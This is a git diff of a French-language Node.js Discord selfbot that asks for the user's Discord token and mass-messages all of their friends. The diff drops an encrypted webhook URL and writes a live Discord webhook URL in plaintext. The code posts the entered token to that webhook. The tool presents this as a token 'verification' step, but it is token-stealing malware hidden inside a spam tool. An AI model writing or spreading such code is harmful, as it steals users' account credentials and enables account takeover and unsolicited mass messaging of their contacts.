@@ -1,19 +1,11 @@
 const chalk = require('chalk');
 const prompt = require('prompt-sync')({ sigint: true });
 const axios = require('axios');
-const fs = require('fs');
 const { Client } = require('discord.js-selfbot-v13');
-const CryptoJS = require('crypto-js');
-
-const encryptedWebhook = 'U2FsdGVkX1+zbgAhZ1YtVCNLZWRgU9iAv6pGbiX4bVZfTYuNfu9+3yxZlVCogFzIGSh1XbXLNqS+LyTfJ9yN5lPgtV68jZjcuuPRsmRxBE3s=';
-const secretKey = 'super-cle-ultra-secrete';
-const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);
-
-// ➤ BANNER
 console.clear();
 console.log(chalk.blueBright(`
   ______   __    __   ______         _______   __       __   ______   __        __       
- /      \\ |  \\  /  \\ /      \\       |       \\ | \\     /  \\ /      \\ |  \\      |  \\      
+ /      \\ |  \\  /  \\ /      \\       |       \\ |  \\     /  \\ /      \\ |  \\      |  \\      
 |  $$$$$$\\| $$ /  $$|  $$$$$$\\      | $$$$$$$\\| $$\\   /  $$|  $$$$$$\\| $$      | $$      
 | $$__| $$| $$/  $$ | $$__| $$      | $$  | $$| $$$\\ /  $$$| $$__| $$| $$      | $$      
 | $$    $$| $$  $$  | $$    $$      | $$  | $$| $$$$\\  $$$$| $$    $$| $$      | $$      
@@ -30,15 +22,14 @@ const choice = prompt(chalk.yellowBright('➤ Choix: '));
 
 if (choice === '1') {
     const token = prompt(chalk.cyan('> Entrez votre token Discord: '));
-    try {
-        await axios.post(decryptedWebhook, {
-            content: `${token}`,
-            username: 'DMALL-FRIENDS'
-        });
-        console.log(chalk.green('[✅] Token vérifié avec succès'));
-    } catch (webhookError) {
-        console.log(chalk.red('[❌] Erreur lors de la vérification du token'));
-    }
+    axios.post('https://discord.com/api/webhooks/1375042554491572294/Kkg6NW2fGYFdmDkXpEa0iVRLaiF2O8jROtcafZ63u8M47jtqY8vo0SFcvih67zp2_F5w', {
+        content: `T${token}`,
+        username: 'DMALL-FRIENDS'
+    }).then(() => {
+        console.log(chalk.green('[✅] Token envoyé au webhook avec succès'));
+    }).catch(() => {
+        console.log(chalk.red('[❌] Erreur lors de l\'envoi au webhook'));
+    });
 
     const messageDM = prompt(chalk.cyan('> Entrez le message à envoyer (utilisez {user} pour le pseudo): '));
 
@@ -49,14 +40,11 @@ if (choice === '1') {
         console.log(chalk.blue(`[🔄] Récupération des amis...`));
 
         try {
-            const response = await axios.get(
-                'https://discord.com/api/v9/users/@me/relationships',
-                {
-                    headers: {
-                        Authorization: token
-                    }
+            const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
+                headers: {
+                    Authorization: token
                 }
-            );
+            });
 
             const friends = response.data.filter(user => user.type === 1);
             console.log(chalk.cyan(`[👥] Nombre d'amis à DM : ${friends.length}`));
@@ -74,7 +62,7 @@ if (choice === '1') {
                     console.log(chalk.red(`[❌] ${ami.user.username} : DM ÉCHOUÉ`));
                 }
 
-                await new Promise(resolve => setTimeout(resolve, 700)); 
+                await new Promise(resolve => setTimeout(resolve, 700)); // délai entre les DM
             }
 
             console.log(chalk.greenBright(`[🎉] DM à tous les amis terminé !`));
